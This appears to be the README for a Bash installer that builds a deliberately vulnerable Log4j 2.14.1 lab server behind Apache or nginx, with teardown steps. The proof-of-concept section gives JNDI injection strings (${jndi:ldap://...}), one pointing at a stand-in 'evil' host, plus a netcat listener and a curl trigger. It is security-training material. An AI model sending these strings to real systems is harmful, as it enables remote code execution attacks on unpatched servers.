# Log4Shell-Lab Installer 

A single Bash script that builds a **deliberately vulnerable Log4j 2.14.1 server**, hides it behind either **Apache httpd** (default) or **nginx**, registers everything as systemd units, and logs every step to `/var/log/log4shell-installer.log`.



---

## Features
| Item | Details |
|------|---------|
| **Distro-aware** | Debian/Ubuntu, RHEL/CentOS/Fedora/Alma/Rocky/Amazon, openSUSE Leap/Tumbleweed/SLE |
| **Pick your proxy** | `./lab.sh` → Apache httpd → 80 → 8080  •  `./lab.sh nginx` → nginx → 80 → 8080 |
| **Verbose logging** | All stdout/err piped to `/var/log/log4shell-installer.log` plus pretty timestamps |
| **DEBUG flag** | `DEBUG=1 ./lab.sh` adds `set -x` shell trace |
| **Systemd integration** | `vuln-log4j.service` auto-enabled, restarts on failure |
| **Auto-fetch jars** | Downloads Log4j API + Core 2.14.1 into `/opt/log4shell-lab/lib` |

---


System files:

* `/etc/systemd/system/vuln-log4j.service`
* `/etc/{apache2|httpd|nginx}/.../log4shell.conf`
* `/var/log/log4shell-installer.log`  ← complete install transcript

---

## Prerequisites

* Root privileges (`sudo`)
* Outbound HTTPS to Maven Central
* Ports **80** and **8080** free (unless you tweak)

---

## Quick start

```bash
chmod +x lab.sh
sudo ./lab.sh            # Apache reverse-proxy
# OR
sudo ./lab.sh nginx      # nginx reverse-proxy

```

## Output ends with:
```bash
Ready →  http://localhost/?msg=${jndi:ldap://evil/x}
Backend logs → journalctl -u vuln-log4j -f

```
## POC exploit
```bash
# 1 – start a dummy LDAP listener
sudo nc -lvkp 1389 -n

# 2 – trigger the JNDI injection
curl 'http://localhost/?msg=${jndi:ldap://127.0.0.1:1389/pwn}'

# 3 – netcat window should show an inbound LDAP request
Backend log (journalctl -u vuln-log4j -f) will print:
ERROR VulnerableHTTPServer - CLIENT INPUT: msg=$jndi:ldap://127.0.0.1:1389/pwn
```

# Tear-Down

# Stop and disable services
`sudo systemctl disable --now vuln-log4j.service nginx apache2 httpd 2>/dev/null || true`

# Remove lab files and systemd unit

- `sudo rm -rf /opt/log4shell-lab`
- `sudo rm -f  /etc/systemd/system/vuln-log4j.service`
- `sudo systemctl daemon-reload`

# Delete proxy snippets
- `sudo rm -f /etc/nginx/conf.d/log4shell.conf`
- `sudo rm -f /etc/apache2/conf-available/log4shell.conf`
- `sudo rm -f /etc/httpd/conf.d/log4shell.conf`

# (Optional) purge packages – Debian/Ubuntu example
- `sudo apt-get -y purge nginx\* apache2\* openjdk-17-jdk net-tools lsof`
- `sudo apt-get -y autoremove --purge`


